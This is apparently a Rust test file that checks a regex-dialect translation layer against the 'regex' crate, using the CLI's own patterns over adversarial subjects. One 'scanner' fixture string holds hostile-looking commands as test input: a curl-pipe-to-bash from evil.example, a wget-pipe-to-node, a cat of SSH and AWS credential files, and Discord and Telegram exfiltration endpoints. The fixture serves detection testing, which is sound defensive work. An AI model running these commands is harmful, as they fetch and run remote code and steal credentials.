//! The `regex` crate and `perry_perex::tooling` must answer every pattern the
//! Perry CLI compiles identically.
//!
//! The CLI's patterns were written against `regex`. `tooling` translates them
//! into ECMAScript and runs them on Perex, and the translation is only worth
//! having if it preserves meaning exactly -- including where the two dialects
//! spell something the same way and mean something different. So this does not
//! test the translation against expectations written here; it tests it against
//! `regex` itself, which is what the patterns were reviewed against.
//!
//! The patterns are read out of the CLI's source rather than copied, so a new
//! or edited pattern is covered without anyone remembering to add it here, and
//! a call site this cannot resolve fails the test rather than going unchecked.
//!
//! Each pattern is run over subjects built to land where the dialects are known
//! to differ, plus a sample of this repository's own JavaScript and TypeScript.
//! The whole repository is a separate, ignored test, because unoptimised it
//! takes minutes:
//!
//! ```text
//! cargo test --release -p perry-perex --test dialect_parity -- --ignored
//! ```
//!
//! A disagreement is a translation bug. It is not a reason to keep two engines:
//! the comparison exists so that it comes out empty.
use perry_perex::tooling;
use std::collections::BTreeMap;
use std::fmt::Write as _;
use std::path::{Path, PathBuf};

fn workspace_root() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .ancestors()
        .nth(2)
        .expect("workspace root")
        .to_path_buf()
}

/// Rust source with comments blanked and every string literal replaced by a
/// `§N§` placeholder, alongside the literals' decoded contents. Only raw
/// literals are decoded exactly; that is the only form the CLI writes
/// patterns in, and an ordinary literal used as a pattern is reported rather
/// than guessed at.
struct Masked {
    text: String,
    literals: Vec<Literal>,
}

struct Literal {
    raw: bool,
    contents: String,
}

fn mask(source: &str) -> Masked {
    let bytes = source.as_bytes();
    let mut text = String::with_capacity(source.len());
    let mut literals = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let rest = &source[i..];
        let prev_ident = i > 0 && (bytes[i - 1].is_ascii_alphanumeric() || bytes[i - 1] == b'_');
        if rest.starts_with("//") {
            let end = rest.find('\n').map_or(source.len(), |n| i + n);
            text.extend(std::iter::repeat_n(' ', end - i));
            i = end;
        } else if let Some(body) = rest.strip_prefix("/*") {
            let end = body.find("*/").map_or(source.len(), |n| i + 2 + n + 2);
            text.extend(
                source[i..end]
                    .chars()
                    .map(|c| if c == '\n' { '\n' } else { ' ' }),
            );
            i = end;
        } else if !prev_ident && rest.starts_with('r') && {
            let hashes = rest[1..].bytes().take_while(|&b| b == b'#').count();
            rest[1 + hashes..].starts_with('"')
        } {
            let hashes = rest[1..].bytes().take_while(|&b| b == b'#').count();
            let open = i + 1 + hashes + 1;
            let close = format!("\"{}", "#".repeat(hashes));
            let end = source[open..]
                .find(&close)
                .expect("unterminated raw string")
                + open;
            let _ = write!(text, "§{}§", literals.len());
            literals.push(Literal {
                raw: true,
                contents: source[open..end].to_string(),
            });
            let consumed = &source[i..end + close.len()];
            text.extend(std::iter::repeat_n('\n', consumed.matches('\n').count()));
            i = end + close.len();
        } else if bytes[i] == b'"' && !(i > 0 && bytes[i - 1] == b'\'') {
            let mut j = i + 1;
            while j < bytes.len() && bytes[j] != b'"' {
                j += if bytes[j] == b'\\' { 2 } else { 1 };
            }
            let _ = write!(text, "§{}§", literals.len());
            literals.push(Literal {
                raw: false,
                contents: source[i + 1..j].to_string(),
            });
            text.extend(std::iter::repeat_n(
                '\n',
                source[i..=j].matches('\n').count(),
            ));
            i = j + 1;
        } else if bytes[i] == b'\'' {
            // A char literal is `'x'` or `'\…'`; anything else is a lifetime.
            let close = if rest[1..].starts_with('\\') {
                rest[2..].find('\'').map(|n| i + 2 + n)
            } else {
                rest[1..]
                    .char_indices()
                    .nth(1)
                    .filter(|&(_, c)| c == '\'')
                    .map(|(n, _)| i + 1 + n)
            };
            match close {
                Some(end) => {
                    text.push_str("' '");
                    i = end + 1;
                }
                None => {
                    text.push('\'');
                    i += 1;
                }
            }
        } else {
            let ch = rest.chars().next().unwrap();
            text.push(ch);
            i += ch.len_utf8();
        }
    }
    Masked { text, literals }
}

/// Identifiers a `format!` hole in a CLI pattern is filled with. The CLI fills
/// them with JavaScript identifiers and its own synthetic names, escaped.
const HOLE_FILLERS: &[&str] = &[
    "require",
    "createRequire",
    "__perry_cjs_default__",
    "r$1",
    "café",
    "_",
];

/// Fill a `format!` template's `{}` holes, as `format!` would.
fn fill(template: &str, value: &str) -> String {
    let escaped = tooling::escape(value);
    let mut out = String::new();
    let mut chars = template.chars().peekable();
    while let Some(c) = chars.next() {
        match (c, chars.peek()) {
            ('{', Some('{')) => {
                chars.next();
                out.push('{');
            }
            ('}', Some('}')) => {
                chars.next();
                out.push('}');
            }
            ('{', Some('}')) => {
                chars.next();
                out.push_str(&escaped);
            }
            _ => out.push(c),
        }
    }
    out
}

/// Every pattern the CLI compiles, keyed by `file:line`.
fn cli_patterns() -> BTreeMap<String, String> {
    let root = workspace_root();
    let site = regex::Regex::new(r"Regex::new\(\s*").unwrap();
    let literal = regex::Regex::new(r"^§(\d+)§").unwrap();
    let template = regex::Regex::new(r"^&format!\(\s*§(\d+)§").unwrap();
    let variable = regex::Regex::new(r"^&?([A-Za-z_][A-Za-z0-9_]*)\s*\)").unwrap();
    let tuple = regex::Regex::new(r"\(\s*§\d+§\s*,\s*§(\d+)§\s*,\s*§\d+§\s*,?\s*\)").unwrap();

    let mut out = BTreeMap::new();
    let mut unresolved = Vec::new();
    for path in rust_files(&root.join("crates/perry/src")) {
        let source = std::fs::read_to_string(&path).unwrap();
        if !source.contains("Regex::new(") {
            continue;
        }
        let rel = path.strip_prefix(&root).unwrap().display().to_string();
        let masked = mask(&source);
        let text = &masked.text;
        let raw_literal = |index: &str, at: usize| -> Option<String> {
            let lit = &masked.literals[index.parse::<usize>().unwrap()];
            if lit.raw {
                Some(lit.contents.clone())
            } else {
                // An ordinary literal's escapes would need decoding; the CLI
                // does not write patterns that way, and guessing is worse
                // than stopping.
                eprintln!(
                    "{rel}:{}: pattern is not a raw string literal",
                    line_of(text, at)
                );
                None
            }
        };
        for found in site.find_iter(text) {
            let at = found.start();
            let line = line_of(text, at);
            let after = &text[found.end()..];
            let key = format!("{rel}:{line}");
            if let Some(c) = literal.captures(after) {
                match raw_literal(&c[1], at) {
                    Some(p) => {
                        out.insert(key, p);
                    }
                    None => unresolved.push(key),
                }
            } else if let Some(c) = template.captures(after) {
                match raw_literal(&c[1], at) {
                    Some(t) => {
                        for value in HOLE_FILLERS {
                            out.insert(format!("{key}[{value}]"), fill(&t, value));
                        }
                    }
                    None => unresolved.push(key),
                }
            } else if let Some(c) = variable.captures(after) {
                let name = &c[1];
                // `let NAME = format!(r"…", …);` earlier in the same file.
                let binding =
                    regex::Regex::new(&format!(r"let\s+{name}\s*=\s*format!\(\s*§(\d+)§")).unwrap();
                let table = regex::Regex::new(&format!(
                    r"for\s*\(\s*[A-Za-z_]+\s*,\s*{name}\s*,\s*[A-Za-z_]+\s*\)\s*in\s+([A-Za-z_]+)"
                ))
                .unwrap();
                if let Some(b) = binding.captures_iter(&text[..at]).last() {
                    match raw_literal(&b[1], at) {
                        Some(t) => {
                            for value in HOLE_FILLERS {
                                out.insert(format!("{key}[{value}]"), fill(&t, value));
                            }
                        }
                        None => unresolved.push(key),
                    }
                } else if let Some(t) = table.captures_iter(&text[..at]).last() {
                    // A rule table: `let raw: &[(&str, &str, &str)] = &[ (id, pattern, message), … ];`
                    let table_name = &t[1];
                    let start = regex::Regex::new(&format!(r"let\s+{table_name}\s*:[^=]*=\s*&\["))
                        .unwrap()
                        .find_iter(&text[..at])
                        .last()
                        .map(|m| m.end());
                    let Some(start) = start else {
                        unresolved.push(key);
                        continue;
                    };
                    let end = start + text[start..].find("];").expect("unterminated rule table");
                    let mut rows = 0;
                    for row in tuple.captures_iter(&text[start..end]) {
                        match raw_literal(&row[1], start) {
                            Some(p) => {
                                rows += 1;
                                out.insert(format!("{key}#{rows}"), p);
                            }
                            None => unresolved.push(format!("{key}#{}", rows + 1)),
                        }
                    }
                    if rows == 0 {
                        unresolved.push(key);
                    }
                } else {
                    unresolved.push(key);
                }
            } else {
                unresolved.push(key);
            }
        }
    }
    assert!(
        unresolved.is_empty(),
        "these `Regex::new` sites could not be read, so their patterns would go \
         unchecked; teach `cli_patterns` their shape: {unresolved:#?}"
    );
    out
}

fn line_of(text: &str, at: usize) -> usize {
    text[..at].matches('\n').count() + 1
}

fn rust_files(dir: &Path) -> Vec<PathBuf> {
    walk(dir, &|p| p.extension().is_some_and(|e| e == "rs"))
}

fn source_files(dir: &Path) -> Vec<PathBuf> {
    walk(dir, &|p| {
        matches!(
            p.extension().and_then(|e| e.to_str()),
            Some("js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx")
        )
    })
}

fn walk(dir: &Path, keep: &dyn Fn(&Path) -> bool) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut stack = vec![dir.to_path_buf()];
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name();
            if path.is_dir() {
                if name != "target" && name != ".git" && name != "node_modules" {
                    stack.push(path);
                }
            } else if keep(&path) {
                out.push(path);
            }
        }
    }
    out.sort();
    out
}

/// Patterns that exercise the translation beyond what the CLI happens to use
/// today: every construct it translates, in the forms most likely to part.
const GENERAL_PATTERNS: &[&str] = &[
    r"",
    r"a*",
    r"b*",
    r"^",
    r"$",
    r"(?m)^",
    r"(?m)$",
    r"(?m)^\s*$",
    r"\b",
    r"\B",
    r"\w+",
    r"\W+",
    r"\d+",
    r"\D+",
    r"\s+",
    r"\S+",
    r"[\w\s]+",
    r"[^\w\s]+",
    r"[\d.]+",
    r".",
    r"(?s).",
    r".+",
    r"(?s).+",
    r"(?i)k",
    r"(?i)s",
    r"(?i)[a-z]+",
    r"(?i)ǅ",
    r"(?i)straße",
    r"(a|ab)(c|bcd)(d*)",
    r"(a+?)(b*)",
    r"x{2,3}?",
    r"(?:ab){2}",
    r"(?P<first>a)|(?P<second>b)",
    r"[\x00-\x7f]+",
    r"\x{1F600}",
    r"[^\n]{0,3}",
    r"\t|\n|\r",
    r"[\-\]]+",
    r"a]b}c",
    r"(?m)^(\w+):\s*(.*)$",
    r"\bfoo\b",
    r"(?i)\bFOO\b",
    r"(?im)^import\b.*$",
    r"(?m)(?:^|;)\s*x",
    r"\$\{[^}]*\}",
    r#"["'`]"#,
    r"\#\&\~\-",
];

/// Subjects placed where the dialects differ, and the shapes the CLI scans.
fn adversarial_subjects() -> Vec<(String, String)> {
    let mut v: Vec<(String, String)> = Vec::new();
    let mut add = |name: &str, text: String| v.push((name.to_string(), text));
    // Line terminators: only `\n` ends a line in `regex`.
    add(
        "crlf",
        "var a = require('a');\r\nmodule.exports = {\r\n  a\r\n};\r\nimport 'b'\r\n".into(),
    );
    add("bare-cr", "x\rimport 'a'\rmodule.exports.b = 1\r".into());
    add(
        "line-separators",
        "x\u{2028}import 'a'\u{2029}exports.c = 2\u{2028}".into(),
    );
    add("nel", "require\u{85}('x')\u{85}import 'y'\n".into());
    // Whitespace sets: U+FEFF is ECMAScript `\s` only, U+0085 is Unicode only.
    add(
        "feff",
        "require\u{feff}('x')\nexports\u{feff}.a = 1\n".into(),
    );
    add(
        "nbsp-ideographic",
        "require\u{a0}(\u{3000}'x'\u{2003})\n".into(),
    );
    // Word characters beyond ASCII, next to keywords `\b` guards.
    add(
        "word-boundaries",
        "дeval(atob(x)) évalé eval\u{e9}(atob(y)) \u{ff11}eval(atob(z))".into(),
    );
    add(
        "unicode-identifiers",
        "export * as café from './x.js'\nexport * as \u{43f} from './y.js'\nclass café {}\n".into(),
    );
    // Combining marks are word characters in `regex` (`\p{M}`), in all three
    // categories: nonspacing, spacing and enclosing.
    add("combining-marks", "export * as cafe\u{301} from './x.js'\nclass a\u{20dd} {}\nकः.x = 1; eval\u{301}(atob(x))\n".into());
    // Digits beyond ASCII, which `regex`'s `\d` matches.
    add(
        "unicode-digits",
        "https://\u{664}\u{662}.1.2.3/x https://\u{ff11}\u{ff12}.3.4.5/y (١..٢,".into(),
    );
    // Case folding across the ASCII boundary.
    add("folding", "https://di\u{17f}cord.com/api/webhooks/1 process.env.TO\u{212a}EN \u{131}eval(atob(x)) \u{130}".into());
    // Bounded windows count characters in `regex`, not UTF-16 units.
    add(
        "astral-window",
        format!("eval({}atob(x))", "😀".repeat(150)),
    );
    add(
        "astral-window-long",
        format!("eval({}atob(x))", "😀".repeat(201)),
    );
    add(
        "astral",
        "😀😀 require('x') 😀\nimport '😀/mod.js'\n".into(),
    );
    // Empty and degenerate.
    add("empty", String::new());
    add("newlines", "\n\n\n".into());
    // What the scanner looks for.
    add(
        "scanner",
        concat!(
            "curl -sL https://evil.example/x.sh | bash\n",
            "wget -qO- http://1.2.3.4/p | node\n",
            "eval(atob('aGVsbG8='))\n",
            "new Function(Buffer.from('x', \"base64\").toString())()\n",
            "fetch('https://discordapp.com/api/webhooks/1/2')\n",
            "https://api.telegram.org/bot123/sendMessage\n",
            "cat ~/.ssh/id_rsa $HOME/.aws/credentials ~/.npmrc ~/.config/gh/hosts.yml\n",
            "process.env . MY_API_KEY_X; process.env.HOME + '/.ssh'\n",
            "require('child_process').execSync('x' + process.env.TOKEN)\n",
            "vm.runInNewContext(src); burpcollaborator.net oast.fun interactsh\n",
        )
        .into(),
    );
    add(
        "base64-blob",
        format!("const p = \"{}\"; eval(p)", "QUJD".repeat(300)),
    );
    // What the compile path looks for.
    add(
        "cjs",
        concat!(
            "var a = require('a'), b = 1;\n",
            "const c = require(\"c\")\n",
            "  , d = require('d');\n",
            "if (x) module.exports = require('./impl');\n",
            "module['exports'] = Thing;\n",
            "exports['name'] = 1; e.exports['inner'] = 2;\n",
            "module.exports.named = require('./named');\n",
            "tslib.__exportStar(require('./star'), exports)\n",
            "__export2(exports, {\n  a: () => a\n});\n",
            "if (process.platform === 'darwin') {\n  a()\n} else {\n  b()\n}\n",
            "`@parcel/watcher-${process.platform}-${process.arch}${process.platform === 'linux' ? `-${libc || 'glibc'}` : ''}`\n",
            "const p = \"/$bunfs/root/app.js\"; const q = '/$bunfs/root/b.js'; const t = `/$bunfs/root/c.js`;\n",
            "#[no_mangle]\npub unsafe extern \"C\" fn napi_register_module_v1() {}\n",
            "error at (12..34, something)\n",
        )
        .into(),
    );
    add(
        "esm",
        concat!(
            "import { createRequire as cr } from 'node:module'\n",
            "const require = cr(import.meta.url);\n",
            "const r$1: NodeRequire = createRequire(import.meta.url);\n",
            "require('fs'); x.require('no'); require.resolve('path')\n",
            "import def, { a } from './a.js'\nimport './side.js'\nexport * as ns from './ns.js'\n",
            "export { b } from './b.js'\nconst m = import('./dyn.js')\n",
            "function require(x) {}\nclass __perry_cjs_default__ {}\nclass café {}\n",
            "_.x = 1; café.y = 2; r$1.z = 3;\n",
        )
        .into(),
    );
    v
}

fn general_subjects() -> Vec<(String, String)> {
    [
        "",
        "a",
        "ab",
        "abcd",
        "baaa",
        "straße STRASSE",
        "KELVIN \u{212a} k \u{17f} S",
        "ǅ ǆ Ǆ",
        "café au lait",
        "cafe\u{301} au lait a\u{20dd}b \u{915}\u{903}",
        "x\r\ny\n\nz\r",
        "\u{2028}a\u{2029}b\u{85}c\u{feff}d",
        "😀a😀",
        "١٢٣ 123 １２３ 1.5",
        "foo_bar foo-bar Foo FOO foo",
        "\t \u{a0}\u{3000}",
        "a]b}c a-b]c",
        "import x\nimport y\r\nimport z",
        "key: value\nother:  thing\n",
        "${a} ${b}",
        "#&~-",
        "xxx xx x",
        "abcbcd",
    ]
    .iter()
    .map(|s| (format!("{s:?}"), s.to_string()))
    .collect()
}

/// Every group of every match, and the boolean answer, as comparable text.
fn answer_regex(re: &regex::Regex, text: &str) -> String {
    let mut s = format!("is_match={}", re.is_match(text));
    for caps in re.captures_iter(text) {
        s.push_str(" |");
        for i in 0..caps.len() {
            match caps.get(i) {
                Some(m) => {
                    let _ = write!(s, " {i}:{:?}", m.range());
                }
                None => {
                    let _ = write!(s, " {i}:-");
                }
            }
        }
    }
    s
}

fn answer_tooling(re: &tooling::Regex, text: &str) -> String {
    let mut s = format!("is_match={}", re.is_match(text));
    // At most one match can start at each character boundary, so more than that
    // means the walk has stopped advancing. Fail rather than hang.
    let bound = text.chars().count() + 1;
    for (n, caps) in re.captures_iter(text).enumerate() {
        assert!(
            n < bound,
            "iteration of `{}` did not terminate",
            re.as_str()
        );
        s.push_str(" |");
        for i in 0..caps.len() {
            match caps.get(i) {
                Some(m) => {
                    let _ = write!(s, " {i}:{:?}", m.range());
                }
                None => {
                    let _ = write!(s, " {i}:-");
                }
            }
        }
    }
    s
}

/// Compare every pattern over every subject and report every disagreement.
fn compare(patterns: &[(String, String)], subjects: &[(String, String)]) -> (usize, Vec<String>) {
    let mut compared = 0;
    let mut disagreements = Vec::new();
    for (name, pattern) in patterns {
        let theirs = regex::Regex::new(pattern)
            .unwrap_or_else(|e| panic!("{name}: `regex` rejects `{pattern}`: {e}"));
        let ours = tooling::Regex::new(pattern)
            .unwrap_or_else(|e| panic!("{name}: tooling rejects `{pattern}`: {e:?}"));
        for (subject, text) in subjects {
            compared += 1;
            let expected = answer_regex(&theirs, text);
            let actual = answer_tooling(&ours, text);
            if expected != actual {
                let clip = |s: &str| s.chars().take(240).collect::<String>();
                disagreements.push(format!(
                    "{name} `{pattern}` on {subject}\n      regex:   {}\n      tooling: {}",
                    clip(&expected),
                    clip(&actual)
                ));
            }
        }
    }
    (compared, disagreements)
}

fn assert_agree(label: &str, patterns: &[(String, String)], subjects: &[(String, String)]) {
    let (compared, disagreements) = compare(patterns, subjects);
    eprintln!(
        "{label}: {compared} answers compared ({} patterns x {} subjects)",
        patterns.len(),
        subjects.len()
    );
    assert!(
        disagreements.is_empty(),
        "{label}: {} of {compared} answers disagree:\n  {}",
        disagreements.len(),
        disagreements
            .iter()
            .take(40)
            .cloned()
            .collect::<Vec<_>>()
            .join("\n  ")
    );
}

fn with_names(map: BTreeMap<String, String>) -> Vec<(String, String)> {
    map.into_iter().collect()
}

#[test]
fn every_cli_call_site_is_read() {
    let patterns = cli_patterns();
    // Every scanner rule table row and every call site, including the ones
    // built by `format!`. Fewer means a shape stopped being recognised.
    assert!(
        patterns.len() >= 60,
        "only {} patterns read from the CLI",
        patterns.len()
    );
}

#[test]
fn cli_patterns_agree_on_the_inputs_where_the_dialects_part() {
    let mut subjects = adversarial_subjects();
    // The shapes the CLI sees in practice, sampled so an unoptimised run stays
    // quick. The ignored test below runs all of them.
    let files = source_files(&workspace_root());
    for path in files.iter().step_by(97).take(40) {
        if let Ok(text) = std::fs::read_to_string(path) {
            let text: String = text.chars().take(32 * 1024).collect();
            subjects.push((path.display().to_string(), text));
        }
    }
    assert_agree("cli", &with_names(cli_patterns()), &subjects);
}

#[test]
fn general_patterns_agree() {
    let patterns: Vec<_> = GENERAL_PATTERNS
        .iter()
        .map(|p| (format!("general `{p}`"), p.to_string()))
        .collect();
    let mut subjects = general_subjects();
    subjects.extend(adversarial_subjects());
    assert_agree("general", &patterns, &subjects);
}

#[test]
#[ignore = "minutes unoptimised; run with --release -- --ignored"]
fn cli_patterns_agree_on_every_source_file_in_the_repository() {
    let root = workspace_root();
    let mut subjects = adversarial_subjects();
    let mut bytes = 0;
    for path in source_files(&root) {
        if let Ok(text) = std::fs::read_to_string(&path) {
            bytes += text.len();
            subjects.push((path.display().to_string(), text));
        }
    }
    let patterns = with_names(cli_patterns());
    let started = std::time::Instant::now();
    assert_agree("repository", &patterns, &subjects);
    eprintln!(
        "repository: {bytes} bytes of source, both engines, in {:?}",
        started.elapsed()
    );
}
